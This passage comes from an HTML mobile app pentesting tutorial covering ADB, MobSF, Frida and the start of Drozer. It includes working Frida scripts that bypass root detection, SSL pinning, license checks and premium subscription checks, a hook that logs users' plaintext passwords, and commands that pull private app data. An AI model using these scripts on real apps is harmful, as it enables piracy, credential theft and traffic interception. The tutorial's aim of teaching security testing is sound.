# emulator-5554    device
# R58M12345678     device
# 
# Shows emulators and physical devices
# "device" means ready for commands
# If you see "unauthorized", accept the popup on your phone!</div>

            <h4>ADB Essential Commands (Complete Reference)</h4>

            <div class="code"># ==================== DEVICE MANAGEMENT ====================

# adb devices
# List all connected devices
adb devices

# adb devices -l
# List devices with details (model, product, transport)
adb devices -l

# Output:
# emulator-5554          device product:sdk_gphone64_arm64 model:sdk_gphone64_arm64 device:emu64a transport_id:1

# adb connect <ip>:<port>
# Connect to device over network (WiFi ADB)
adb connect 192.168.1.100:5555

# adb disconnect
# Disconnect all network devices
adb disconnect

# adb -s <device_id> <command>
# Run command on specific device (when multiple devices connected)
adb -s emulator-5554 shell

# adb kill-server
# Stop ADB server
adb kill-server

# adb start-server
# Start ADB server
adb start-server

# ==================== APP INSTALLATION ====================

# adb install <apk>
# Install APK to device
adb install myapp.apk

# Output:
# Performing Streamed Install
# Success

# adb install -r <apk>
# Reinstall existing app (keeps data)
adb install -r myapp.apk

# adb install -g <apk>
# Install and grant all permissions
adb install -g myapp.apk

# adb install -d <apk>
# Allow version downgrade
adb install -d myapp_v1.0.apk

# adb install -t <apk>
# Allow test APKs
adb install -t debug.apk

# adb uninstall <package_name>
# Uninstall app
adb uninstall com.example.myapp

# adb uninstall -k <package_name>
# Uninstall but keep data
adb uninstall -k com.example.myapp

# ==================== FILE TRANSFER ====================

# adb push <local> <remote>
# Copy file from computer to device
adb push payload.txt /sdcard/Download/

# adb push directory/ <remote>
# Copy entire directory
adb push tools/ /sdcard/tools/

# adb pull <remote> <local>
# Copy file from device to computer
adb pull /sdcard/DCIM/Camera/photo.jpg ./

# adb pull /data/data/com.example.app/databases/ ./databases/
# Pull app's databases (requires root!)

# ==================== SHELL ACCESS ====================

# adb shell
# Open interactive shell on device
adb shell

# Now you're inside Android! You can run Linux commands:
# ls /sdcard/
# cd /data/app/
# ps -A    (list all processes)
# exit     (leave shell)

# adb shell <command>
# Run single command without interactive shell
adb shell ls -la /sdcard/

# adb shell 'command1; command2'
# Run multiple commands
adb shell 'cd /sdcard/ && ls'

# adb root
# Restart ADB daemon with root permissions (rooted devices only)
adb root

# Output:
# restarting adbd as root

# adb unroot
# Restart ADB daemon without root
adb unroot

# ==================== PACKAGE MANAGER (pm) ====================

# adb shell pm list packages
# List ALL installed packages
adb shell pm list packages

# Output (partial):
# package:com.android.camera
# package:com.example.myapp
# package:com.whatsapp
# [hundreds more...]

# adb shell pm list packages -f
# List packages with APK file paths
adb shell pm list packages -f

# Output:
# package:/data/app/com.example.myapp-xyz=/com.example.myapp

# adb shell pm list packages -3
# List only third-party apps (not system apps)
adb shell pm list packages -3

# adb shell pm list packages <keyword>
# Filter packages by keyword
adb shell pm list packages | grep bank

# Output:
# package:com.bankofamerica.mobile
# package:com.chase.banking

# adb shell pm path <package>
# Show APK path for package
adb shell pm path com.example.myapp

# Output:
# package:/data/app/com.example.myapp-ABC123/base.apk

# adb shell pm dump <package>
# Show EVERYTHING about a package
adb shell pm dump com.example.myapp

# Output:
# Package [com.example.myapp] (12a34b56):
#   userId=10123
#   pkg=Package{...}
#   codePath=/data/app/com.example.myapp-ABC123
#   resourcePath=/data/app/com.example.myapp-ABC123
#   legacyNativeLibraryDir=/data/app/com.example.myapp-ABC123/lib
#   primaryCpuAbi=arm64-v8a
#   versionCode=100 minSdk=21 targetSdk=33
#   versionName=1.0.0
#   [... TONS more info ...]

# adb shell pm grant <package> <permission>
# Grant permission to app
adb shell pm grant com.example.myapp android.permission.CAMERA

# adb shell pm revoke <package> <permission>
# Revoke permission from app
adb shell pm revoke com.example.myapp android.permission.CAMERA

# adb shell pm clear <package>
# Clear app data (like "Clear Cache" in settings)
adb shell pm clear com.example.myapp

# Output:
# Success

# ==================== ACTIVITY MANAGER (am) ====================

# adb shell am start <intent>
# Launch an app/activity
adb shell am start -n com.example.myapp/.MainActivity

# -n = component name (package/activity)
# Output:
# Starting: Intent { cmp=com.example.myapp/.MainActivity }

# adb shell am start -a <action>
# Start activity with action
adb shell am start -a android.intent.action.VIEW -d https://example.com

# Opens URL in default browser

# adb shell am startservice <intent>
# Start a service
adb shell am startservice -n com.example.myapp/.MyService

# adb shell am broadcast <intent>
# Send broadcast
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED

# Simulates device boot

# adb shell am force-stop <package>
# Force-stop an app
adb shell am force-stop com.example.myapp

# adb shell am kill <package>
# Kill app (less aggressive than force-stop)
adb shell am kill com.example.myapp

# ==================== LOGS ====================

# adb logcat
# View system logs in real-time
adb logcat

# Output (scrolls continuously):
# 01-07 14:30:45.123  1234  5678 I ActivityManager: Start proc 9999:com.example.myapp
# 01-07 14:30:45.456  9999  9999 D MyApp: User logged in: user@example.com
# 01-07 14:30:45.789  9999  9999 E MyApp: Error: java.lang.NullPointerException
# [... continuous stream ...]

# adb logcat -c
# Clear the log buffer
adb logcat -c

# adb logcat <tag>:V
# Filter by tag (V=Verbose, show everything for this tag)
adb logcat MyApp:V *:S

# *:S = silence all other tags
# Shows only logs from "MyApp" tag

# adb logcat *:E
# Show only ERROR level logs
adb logcat *:E

# adb logcat | grep "password"
# Search logs for keyword
adb logcat | grep -i "password"

# Dangerous if app logs passwords!

# adb logcat -v time
# Add timestamps to logs
adb logcat -v time

# adb logcat -d
# Dump logs and exit (don't follow)
adb logcat -d > logs.txt

# Saves logs to file

# ==================== SYSTEM INFORMATION ====================

# adb shell dumpsys
# Dump system services info (HUGE output!)
adb shell dumpsys

# adb shell dumpsys battery
# Show battery info
adb shell dumpsys battery

# Output:
# Current Battery Service state:
#   AC powered: false
#   USB powered: true
#   level: 85
#   temperature: 280
#   voltage: 4235

# adb shell dumpsys package <package>
# Show package details (like pm dump but different format)
adb shell dumpsys package com.example.myapp

# adb shell dumpsys activity
# Show activity stack (what apps are running)
adb shell dumpsys activity

# adb shell dumpsys meminfo <package>
# Show memory usage
adb shell dumpsys meminfo com.example.myapp

# Output:
# Applications Memory Usage (in Kilobytes):
# Uptime: 123456 Realtime: 123456
# 
# ** MEMINFO in pid 12345 [com.example.myapp] **
#                    Pss  Private  Shared
#           Native Heap    10000     9000    1000
#           Dalvik Heap    20000    19000    1000
#                  [...]
#                  TOTAL    50000    45000    5000

# adb shell dumpsys window
# Show window manager state
adb shell dumpsys window

# adb shell dumpsys connectivity
# Show network connectivity info
adb shell dumpsys connectivity

# ==================== SCREENSHOTS & RECORDINGS ====================

# adb shell screencap /sdcard/screen.png
# Take screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png ./

# adb shell screenrecord /sdcard/demo.mp4
# Record screen video
adb shell screenrecord /sdcard/demo.mp4

# Press Ctrl+C to stop recording
# Then:
adb pull /sdcard/demo.mp4 ./

# adb shell screenrecord --time-limit <seconds>
# Record for specific duration
adb shell screenrecord --time-limit 30 /sdcard/demo.mp4

# Records for 30 seconds then stops

# ==================== NETWORKING ====================

# adb shell netstat
# Show network connections
adb shell netstat

# adb shell ip addr
# Show IP addresses
adb shell ip addr

# adb shell ping <host>
# Ping a host
adb shell ping google.com

# adb shell tcpdump -w /sdcard/capture.pcap
# Capture network traffic (requires tcpdump on device)
adb shell tcpdump -w /sdcard/capture.pcap
# Then:
adb pull /sdcard/capture.pcap ./

# ==================== ADVANCED / PENTESTING ====================

# adb shell run-as <package>
# Run commands as the app's user (access app's private data)
adb shell
# Inside shell:
run-as com.example.myapp
cd /data/data/com.example.myapp/databases/
ls -la

# Output:
# -rw------- 1 u0_a123 u0_a123 12345 2026-01-07 14:30 userdata.db

# Now you can read the app's database!

# adb backup <package>
# Backup app data
adb backup -f backup.ab com.example.myapp

# Creates backup.ab file
# To extract:
# dd if=backup.ab bs=1 skip=24 | openssl zlib -d | tar -xvf -

# adb restore <backup_file>
# Restore app data
adb restore backup.ab

# adb shell cat /proc/net/tcp
# Show TCP connections (hexadecimal format)
adb shell cat /proc/net/tcp

# adb shell su
# Switch to root user (rooted devices only)
adb shell
su
# Now you have root shell (#)
# Can access /data/data/ directories of all apps!

# adb forward tcp:<local_port> tcp:<remote_port>
# Port forwarding (access device services from computer)
adb forward tcp:8080 tcp:8080

# Now accessing localhost:8080 on your computer connects to device's port 8080!</div>

            <div class="metaphor-box">
                <h4>üí° ADB is Your Remote Control for Android</h4>
                <p>Think of ADB like a universal remote for Android devices:<br><br>
                ‚Ä¢ <strong>Install/uninstall apps:</strong> Like a software store manager<br>
                ‚Ä¢ <strong>Transfer files:</strong> Like a USB cable on steroids<br>
                ‚Ä¢ <strong>View logs:</strong> Like reading the device's diary<br>
                ‚Ä¢ <strong>Shell access:</strong> Like having a terminal inside the phone<br>
                ‚Ä¢ <strong>Package manager:</strong> Like Android's app inventory system<br>
                ‚Ä¢ <strong>Activity manager:</strong> Like the phone's task manager<br><br>
                For pentesters, ADB is ESSENTIAL for dynamic analysis. You use it to:<br>
                1. Install modified APKs<br>
                2. Pull app databases and config files<br>
                3. Monitor logs for sensitive data leakage<br>
                4. Access app's private directory (with run-as or root)<br>
                5. Intercept network traffic<br><br>
                Master ADB = Master mobile pentesting!</p>
            </div>

<h3>Part 4: MobSF - Mobile Security Framework</h3>

<p><strong>MobSF</strong> is an automated mobile app security testing framework. It combines static analysis, dynamic analysis, and security report generation into ONE powerful tool with a web interface!</p>

<div class="code"># Install MobSF (Docker method - easiest):
docker pull opensecurity/mobile-security-framework-mobsf

# Run MobSF:
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Output:
# [INFO] MobSF is running on http://0.0.0.0:8000
# 
# Open browser: http://localhost:8000

# Manual install (alternative):
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
./setup.sh
./run.sh

# Web interface opens at http://127.0.0.1:8000</div>

<h4>Using MobSF for Static Analysis</h4>

<div class="code"># Step 1: Open MobSF web interface (http://localhost:8000)

# Step 2: Upload APK
# - Click "Upload" button
# - Select your APK file
# - Wait for analysis (1-3 minutes)

# Step 3: View Security Report
# MobSF automatically analyzes:
# ‚úÖ AndroidManifest.xml (permissions, components, attack surface)
# ‚úÖ Decompiled code (hardcoded secrets, crypto issues, vulnerabilities)
# ‚úÖ Binary analysis (native libraries)
# ‚úÖ Network security (SSL pinning, cleartext traffic)
# ‚úÖ OWASP Mobile Top 10 compliance
# ‚úÖ Security score (0-100)

# Report sections:
# - File Info: App name, package, version, size, hashes
# - App Permissions: Dangerous permissions highlighted
# - Manifest Analysis: Exported components, debuggable flag
# - Code Analysis: Hardcoded secrets, insecure crypto, SQL injection
# - Binary Analysis: Native code security
# - File Analysis: Interesting files in APK
# - Certificate Info: Signing certificate details
# - Network Security: SSL/TLS configuration

# Step 4: Download Report
# Click "PDF Report" to get professional security assessment document!</div>

<h4>MobSF Dynamic Analysis</h4>

<div class="code"># Dynamic analysis requires running the app in an emulator/device

# Step 1: Set up Android emulator with MobSF support
# (Use Genymotion or Android Studio AVD with Google APIs)

# Step 2: Connect emulator to MobSF
# In MobSF web interface:
# - Click "Dynamic Analyzer"
# - Select your device/emulator
# - Click "Start Dynamic Analysis"

# Step 3: MobSF automatically:
# ‚úÖ Installs the app
# ‚úÖ Sets up proxy to intercept traffic
# ‚úÖ Hooks into the app with Frida
# ‚úÖ Monitors API calls, file operations, network requests

# Step 4: Use the app normally
# - Login, browse, perform actions
# - MobSF captures everything in background

# Step 5: View Dynamic Analysis Results
# - API Endpoints Discovered
# - Captured Network Traffic (HTTP/HTTPS)
# - Sensitive Data in Transit
# - Insecure Data Storage
# - Runtime Permissions Used
# - Screenshots of Each Activity</div>

<div class="info-box">
<h4>MobSF Security Checks (What It Looks For)</h4>
<p><strong>High Risk Issues:</strong><br>
‚Ä¢ Hardcoded API keys, tokens, passwords<br>
‚Ä¢ Debuggable flag enabled in AndroidManifest<br>
‚Ä¢ Backup flag enabled (allows adb backup)<br>
‚Ä¢ Weak cryptographic algorithms (DES, MD5)<br>
‚Ä¢ SQL injection vulnerabilities<br>
‚Ä¢ Command injection vulnerabilities<br>
‚Ä¢ Insecure random number generation<br>
‚Ä¢ Certificate pinning bypass methods<br><br>
<strong>Medium Risk Issues:</strong><br>
‚Ä¢ Exported activities/services without permissions<br>
‚Ä¢ Cleartext traffic allowed<br>
‚Ä¢ Insufficient SSL/TLS validation<br>
‚Ä¢ Insecure file permissions<br>
‚Ä¢ Logging sensitive information<br><br>
<strong>Low Risk Issues:</strong><br>
‚Ä¢ Obfuscation not enabled<br>
‚Ä¢ Tapjacking vulnerabilities<br>
‚Ä¢ Screenshot allowed on sensitive screens<br><br>
<strong>MobSF maps findings to:</strong><br>
‚Ä¢ OWASP Mobile Top 10<br>
‚Ä¢ CWE (Common Weakness Enumeration)<br>
‚Ä¢ CVSS scores</p>
</div>

<h4>Interpreting MobSF Results</h4>

<div class="code"># Example MobSF findings:

# üî¥ HIGH: Hardcoded Secrets Found
# File: com/example/app/api/ApiClient.java
# Line: 15
# Code: private static final String API_KEY = "sk_live_1234567890";
# 
# Severity: HIGH
# CWE: CWE-798 (Use of Hard-coded Credentials)
# OWASP: M9 - Reverse Engineering
# 
# Impact: API key exposed, attackers can access backend services
# Recommendation: Store keys in secure keystore, never in code

# üî¥ HIGH: App is Debuggable
# File: AndroidManifest.xml
# Line: 8
# Code: android:debuggable="true"
# 
# Severity: HIGH
# CWE: CWE-215 (Information Exposure Through Debug Information)
# OWASP: M7 - Client Code Quality
# 
# Impact: App can be debugged with tools like Android Studio, allowing real-time code inspection
# Recommendation: Set android:debuggable="false" for production builds

# üü° MEDIUM: Exported Activity without Permission
# File: AndroidManifest.xml
# Component: com.example.app.SecretActivity
# Code: android:exported="true"
# 
# Severity: MEDIUM
# CWE: CWE-927 (Use of Implicit Intent for Sensitive Communication)
# OWASP: M1 - Improper Platform Usage
# 
# Impact: Other apps can launch this activity, potentially accessing sensitive functions
# Recommendation: Add permission check or set exported="false"

# üü° MEDIUM: Weak Cryptography - DES
# File: com/example/app/crypto/Encryption.java
# Line: 42
# Code: Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
# 
# Severity: MEDIUM
# CWE: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
# OWASP: M5 - Insufficient Cryptography
# 
# Impact: DES is easily brute-forced (56-bit key)
# Recommendation: Use AES-256 instead

# Overall Security Score: 45/100 (HIGH RISK)</div>

<div class="warning-box">
<h4>‚ö†Ô∏è MobSF Limitations</h4>
<p>MobSF is AMAZING but not perfect:<br><br>
<strong>False Positives:</strong> Some flagged issues may be intentional or not exploitable in context<br>
<strong>Obfuscation Blind Spots:</strong> Heavily obfuscated code may hide vulnerabilities<br>
<strong>Logic Flaws:</strong> Can't detect business logic issues (like "forgot password" bypass)<br>
<strong>Dynamic Analysis Requires Manual Testing:</strong> You still need to test all app features manually<br><br>
<strong>Best practice:</strong> Use MobSF as a starting point, then manually verify findings and test edge cases!</p>
</div>

            <h3>Part 5: Frida - Dynamic Instrumentation Framework</h3>

            <p><strong>Frida</strong> is a powerful dynamic instrumentation toolkit that lets you inject JavaScript into running processes on Android, iOS, Windows, Mac, and Linux. For mobile pentesting, it's your magic wand for bypassing security checks, hooking functions, and manipulating app behavior in real-time!</p>

            <div class="metaphor-box">
                <h4>üí° Frida = X-Ray Vision + Time Control for Apps</h4>
                <p>Imagine an app is a locked mansion with guards and security systems. Traditional static analysis (APKTool, Jadx) lets you study the blueprints after the fact. But Frida lets you:<br><br>
                ‚Ä¢ <strong>See through walls:</strong> Monitor what's happening inside while the app runs<br>
                ‚Ä¢ <strong>Freeze time:</strong> Intercept function calls before they execute<br>
                ‚Ä¢ <strong>Rewrite reality:</strong> Change function parameters, return values, even entire behaviors<br>
                ‚Ä¢ <strong>Read minds:</strong> Log private data being processed in memory<br><br>
                With Frida, you can bypass root detection, SSL pinning, jailbreak checks, license validation‚Äîall without modifying the APK!</p>
            </div>

            <h4>Installing Frida</h4>

            <div class="code"># Install Frida on your Kali machine:
pip3 install frida-tools

# Verify installation:
frida --version

# Output:
# 16.2.1

# Download frida-server for your Android device
# Check your device architecture first:
adb shell getprop ro.product.cpu.abi

# Output examples:
# arm64-v8a    ‚Üê 64-bit ARM (most modern phones)
# armeabi-v7a  ‚Üê 32-bit ARM (older phones)
# x86_64       ‚Üê 64-bit Intel (emulators)

# Download matching frida-server from:
# https://github.com/frida/frida/releases

# Example for arm64-v8a:
wget https://github.com/frida/frida/releases/download/16.2.1/frida-server-16.2.1-android-arm64.xz
unxz frida-server-16.2.1-android-arm64.xz
mv frida-server-16.2.1-android-arm64 frida-server

# Push to device:
adb push frida-server /data/local/tmp/

# Make executable:
adb shell "chmod 755 /data/local/tmp/frida-server"

# Run frida-server on device (requires root!):
adb shell "su -c /data/local/tmp/frida-server &"

# Or for non-root testing with specific apps:
adb shell "/data/local/tmp/frida-server"</div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è Frida Requires Root for Most Features</h4>
                <p>To hook into arbitrary apps, your device needs root access. Alternatives:<br><br>
                <strong>Option 1: Rooted physical device</strong> (Magisk, SuperSU)<br>
                <strong>Option 2: Rooted emulator</strong> (Genymotion, Android Studio AVD with Google APIs)<br>
                <strong>Option 3: Frida Gadget</strong> (inject Frida into the APK itself - no root needed but requires repackaging)<br><br>
                For learning, use a rooted emulator like Genymotion!</p>
            </div>

            <h4>Frida Basics - Your First Hook</h4>

            <div class="code"># List all running processes:
frida-ps -U

# -U = USB device (or emulator)
# Output:
#  PID  Name
# ----  ------------------------------
# 1234  com.android.systemui
# 5678  com.example.targetapp
# 9012  com.google.android.gms
# [... more processes ...]

# List only apps (not system processes):
frida-ps -Ua

# Output:
#  PID  Name                         Identifier
# ----  ---------------------------  --------------------------
# 5678  Target App                   com.example.targetapp
# 9876  Banking App                  com.bankingapp.mobile

# Attach to a running app:
frida -U -n "Target App"

# -U = USB device
# -n = process name
# 
# Opens interactive Frida REPL (Read-Eval-Print Loop)

# Or attach by package name:
frida -U -f com.example.targetapp

# -f = spawn (launch the app with Frida attached from start)

# Or attach by PID:
frida -U 5678</div>

            <h4>Writing Frida Scripts - JavaScript Hooking</h4>

            <p>Frida uses JavaScript to interact with the target app. Here's the anatomy of a Frida script:</p>

            <div class="code"># Create a simple hook script: hook_example.js

Java.perform(function() {
    // Java.perform() ensures we're inside the Java runtime

    // 1. Get reference to the class you want to hook
    var MainActivity = Java.use('com.example.app.MainActivity');
    
    // 2. Hook a method
    MainActivity.checkLicense.implementation = function() {
        // This replaces the original checkLicense() method
        
        console.log('[*] checkLicense() called!');
        console.log('[*] Original would check license, but we\'re bypassing...');
        
        // Return true (license valid) regardless of actual check
        return true;
    };
    
    console.log('[+] License check bypassed!');
});

# Run the script:
frida -U -f com.example.app -l hook_example.js --no-pause

# Output:
# [+] License check bypassed!
# [*] checkLicense() called!
# [*] Original would check license, but we're bypassing...
# 
# The app now thinks it has a valid license!</div>

            <h4>Bypassing Root Detection with Frida</h4>

            <div class="code"># Many apps detect root and refuse to run
# Common checks: su binary exists, Magisk/SuperSU installed, test-keys build

# Create bypass_root_detection.js:

Java.perform(function() {
    console.log('[*] Root detection bypass started');

    // Method 1: Hook common root detection method
    var RootCheck = Java.use('com.example.app.security.RootDetector');
    
    RootCheck.isDeviceRooted.implementation = function() {
        console.log('[*] isDeviceRooted() called - returning false');
        return false;  // Always return false (not rooted)
    };
    
    // Method 2: Hook File.exists() to hide su binary
    var File = Java.use('java.io.File');
    
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        
        // List of paths that indicate root
        var rootPaths = [
            '/system/app/Superuser.apk',
            '/system/bin/su',
            '/system/xbin/su',
            '/data/local/xbin/su',
            '/sbin/su',
            '/system/sd/xbin/su',
            '/system/bin/failsafe/su',
            '/data/local/su'
        ];
        
        // If checking for root files, return false
        if (rootPaths.indexOf(path) !== -1) {
            console.log('[*] File.exists("' + path + '") intercepted - returning false');
            return false;
        }
        
        // Otherwise, call original method
        return this.exists.call(this);
    };
    
    // Method 3: Hook Runtime.exec() to prevent 'su' command execution
    var Runtime = Java.use('java.lang.Runtime');
    
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1) {
            console.log('[*] Runtime.exec("' + cmd + '") intercepted - preventing execution');
            throw new Error('Command not found');
        }
        return this.exec.call(this, cmd);
    };
    
    // Method 4: Hook Build.TAGS to hide test-keys
    var Build = Java.use('android.os.Build');
    
    Build.TAGS.value = 'release-keys';  // Change from 'test-keys' to 'release-keys'
    console.log('[*] Build.TAGS changed to: ' + Build.TAGS.value);
    
    console.log('[+] Root detection fully bypassed!');
});

# Run it:
frida -U -f com.example.app -l bypass_root_detection.js --no-pause

# The app now runs on rooted device without detecting root!</div>

            <h4>Bypassing SSL Pinning with Frida</h4>

            <p>SSL pinning prevents Man-in-the-Middle attacks by only trusting specific certificates. But for pentesting, we WANT to intercept traffic with Burp Suite! Here's how to bypass it:</p>

            <div class="code"># Create bypass_ssl_pinning.js:

Java.perform(function() {
    console.log('[*] SSL Pinning bypass started');

    // Method 1: Hook TrustManager (most common SSL implementation)
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    // Create a custom TrustManager that trusts all certificates
    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {
                console.log('[*] checkClientTrusted called - trusting all');
            },
            checkServerTrusted: function(chain, authType) {
                console.log('[*] checkServerTrusted called - trusting all');
            },
            getAcceptedIssuers: function() {
                console.log('[*] getAcceptedIssuers called - returning empty');
                return [];
            }
        }
    });
    
    // Replace SSLContext's TrustManager with our custom one
    var TrustManagers = [TrustManager.$new()];
    
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[*] SSLContext.init() called - replacing TrustManager');
        this.init.call(this, keyManager, TrustManagers, secureRandom);
    };
    
    // Method 2: Hook OkHttp (popular HTTP library)
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
        
        Builder.certificatePinner.implementation = function(certificatePinner) {
            console.log('[*] OkHttp certificatePinner() called - disabling pinning');
            return this;  // Return builder without pinning
        };
        
        console.log('[+] OkHttp SSL pinning bypassed');
    } catch(err) {
        console.log('[-] OkHttp not found (app might not use it)');
    }
    
    // Method 3: Hook specific app's SSL verification
    // (You need to find the exact class/method via Jadx)
    try {
        var CustomPinning = Java.use('com.example.app.network.CertificatePinner');
        
        CustomPinning.check.implementation = function() {
            console.log('[*] Custom certificate check bypassed');
            return true;  // Always pass verification
        };
    } catch(err) {
        // App doesn't have custom pinning class
    }
    
    console.log('[+] SSL Pinning fully bypassed - use Burp Suite!');
});

# Run with the app:
frida -U -f com.example.app -l bypass_ssl_pinning.js --no-pause

# Configure Burp Suite proxy on your device:
# Settings ‚Üí WiFi ‚Üí Long-press network ‚Üí Modify ‚Üí Proxy: Manual
# Proxy hostname: 192.168.1.100 (your Kali IP)
# Proxy port: 8080

# Now all HTTPS traffic flows through Burp Suite with no certificate errors!</div>

            <h4>Logging Function Arguments and Return Values</h4>

            <div class="code"># Create log_function.js to spy on any function:

Java.perform(function() {
    var TargetClass = Java.use('com.example.app.auth.LoginManager');
    
    // Hook the login method
    TargetClass.doLogin.overload('java.lang.String', 'java.lang.String').implementation = function(username, password) {
        console.log('[*] ===== doLogin() called =====');
        console.log('[*] Username: ' + username);
        console.log('[*] Password: ' + password);  // DANGER: This logs plaintext passwords!
        
        // Call the original method and capture return value
        var result = this.doLogin(username, password);
        
        console.log('[*] Return value: ' + result);
        console.log('[*] ===========================');
        
        return result;  // Pass through the original return value
    };
});

# Run it:
frida -U -f com.example.app -l log_function.js --no-pause

# When user logs in:
# [*] ===== doLogin() called =====
# [*] Username: testuser@example.com
# [*] Password: MySecretPass123
# [*] Return value: true
# [*] ===========================

# You just intercepted the login credentials!</div>

            <h4>Modifying Function Return Values</h4>

            <div class="code"># Create bypass_premium_check.js:

Java.perform(function() {
    var UserAccount = Java.use('com.example.app.model.UserAccount');
    
    // Hook isPremiumUser method
    UserAccount.isPremiumUser.implementation = function() {
        console.log('[*] isPremiumUser() called');
        
        // Original method would check subscription status
        // But we'll just return true!
        console.log('[*] Returning true (premium access granted)');
        return true;
    };
    
    // Hook getSubscriptionExpiry method
    UserAccount.getSubscriptionExpiry.implementation = function() {
        console.log('[*] getSubscriptionExpiry() called');
        
        // Return a date far in the future
        var futureDate = Java.use('java.util.Date').$new();
        futureDate.setYear(2099);  // Subscription expires in 2099!
        
        console.log('[*] Returning subscription expiry: 2099');
        return futureDate;
    };
    
    console.log('[+] Premium bypass active - enjoy all features for free!');
});

# Now the app thinks you have a premium subscription!</div>

            <h4>Frida CLI Tools Reference</h4>

            <div class="code"># frida-ps: List processes
frida-ps -U          # List all processes on USB device
frida-ps -Ua         # List only applications
frida-ps -Uai        # List installed applications (not just running)

# frida: Attach and run scripts
frida -U -n "App Name"                    # Attach to running app by name
frida -U -f com.example.app               # Spawn app with Frida attached
frida -U -f com.example.app --no-pause   # Spawn and don't pause at startup
frida -U -p 1234                          # Attach to process ID 1234
frida -U -f com.example.app -l script.js  # Run script on spawn

# frida-trace: Auto-generate hooks
frida-trace -U -f com.example.app -j '*!*Login*'

# -j = Java method pattern
# '*!*Login*' = All classes, methods containing "Login"
# Auto-generates hook scripts for each method!

# Example: Trace all SSL-related methods:
frida-trace -U -f com.example.app -j '*!*SSL*'

# Trace specific class:
frida-trace -U -f com.example.app -j 'com.example.app.MainActivity!*'

# frida-discover: Discover app's classes and methods
frida-discover -U com.example.app

# frida-ls: List files accessible to app
frida-ls -U com.example.app /data/data/com.example.app/

# frida-kill: Kill a process
frida-kill -U com.example.app</div>

            <div class="metaphor-box">
                <h4>üéâ Frida = Your Mobile App Superpowers!</h4>
                <p>You've learned how to:<br><br>
                ‚úÖ <strong>Bypass root detection</strong> ‚Üí Run pentesting tools on production apps<br>
                ‚úÖ <strong>Bypass SSL pinning</strong> ‚Üí Intercept HTTPS traffic with Burp Suite<br>
                ‚úÖ <strong>Hook any function</strong> ‚Üí Log arguments, modify returns, change behavior<br>
                ‚úÖ <strong>Bypass premium checks</strong> ‚Üí Test app features without paying<br>
                ‚úÖ <strong>Extract sensitive data</strong> ‚Üí Capture passwords, tokens, API keys in memory<br><br>
                Frida is the most powerful tool for mobile dynamic analysis. Combine it with static analysis (APKTool, Jadx) and you can break almost any mobile app!<br><br>
                <strong>Practice challenges:</strong><br>
                ‚Ä¢ Download InsecureBankv2 (intentionally vulnerable app)<br>
                ‚Ä¢ Try bypassing its root detection<br>
                ‚Ä¢ Hook the login function to log credentials<br>
                ‚Ä¢ Bypass premium features<br><br>
                Remember: Only test apps you have permission to test! üöÄ</p>
            </div>

            <h3>Part 6: Drozer - Android Security Assessment Framework</h3>

            <p><strong>Drozer</strong> (formerly Mercury) is a comprehensive security audit and attack framework for Android. It finds and exploits vulnerabilities in Android apps and devices by simulating a malicious app trying to interact with target components.</p>

            <div class="metaphor-box">
                <h4>üí° Drozer = Social Engineering for Android Apps</h4>
                <p>Think of Android apps as houses in a neighborhood. Some houses have unlocked windows (exported components), some leave their WiFi passwords written on the door (insecure data storage), some trust any visitor claiming to be the mailman (intent vulnerabilities).<br><br>
                Drozer is like a burglar doing reconnaissance:<br>
                ‚Ä¢ <strong>Finding entry points:</strong> Exported activities, services, broadcast receivers, content providers<br>
                ‚Ä¢ <strong>Testing locks:</strong> Checking if components require permissions<br>
                ‚Ä¢ <strong>Exploiting trust:</strong> Sending malicious intents to trigger unexpected behavior<br>
                ‚Ä¢ <strong>Stealing data:</strong> Querying content providers without authorization<br><br>
                Drozer automates the discovery and exploitation of these Android-specific vulnerabilities!</p>
            </div>

            <h4>Installing Drozer</h4>

            <div class="code"># Install Drozer on Kali:
# (Drozer Python 3 fork)
git clone https://github.com/WithSecureLabs/drozer.git
cd drozer
pip3 install .

# Verify installation:
drozer --version

# Output:
# drozer 3.0.0

# Download and install Drozer Agent APK on Android device:
wget https://github.com/WithSecureLabs/drozer-agent/releases/download/3.0.0/drozer-agent.apk
adb install drozer-agent.apk

# Launch Drozer Agent app on your device
# Tap "Embedded Server" toggle to start server
# Default port: 31415</div>

            <h4>Connecting Drozer to Your Device</h4>

            <div class="code"># Forward the Drozer port from device to your Kali machine:
adb forward tcp:31415 tcp:31415

# Connect to the Drozer agent:
drozer console connect

# Output:
#             ..                    ..:.
#            ..o..                  .r..
#             ..a..  . ....... .  ..nd
#               ro..idsnemesisand..pr
#               .otectorandroidsneme.
#            .,sisandprotectorandroids+.
#          ..nemesisandprotectorandroidsn:.
#        .emesisandprotectorandroidsnemes..
#      ..isandp,..,rotectorandro,..,idsnem.
#      .isisandp..rotectorandroid..snemisis.
#      ,andprotectorandroidsnemisisandprotec.
#     .torandroidsnemesisandprotectorandroid.
#     .snemisisandprotectorandroidsnemesisan:
#     .dprotectorandroidsnemesisandprotector.
#
# drozer Console (v3.0.0)
# dz>

# You're now connected to the device!</div>

            <h4>Drozer Basic Commands - Information Gathering</h4>

            <div class="code"># Inside Drozer console (dz>):

# List all installed packages:
dz> run app.package.list

# Output:
# com.android.browser
# com.android.calendar
# com.example.vulnerableapp
# [hundreds more...]

# Search for a specific app:
dz> run app.package.list -f bank

# Output:
# com.bankofamerica.mobile
# com.chase.banking
# com.example.bankingapp

# Get detailed info about a package:
dz> run app.package.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   Process Name: com.example.vulnerableapp
#   Version: 1.0.0
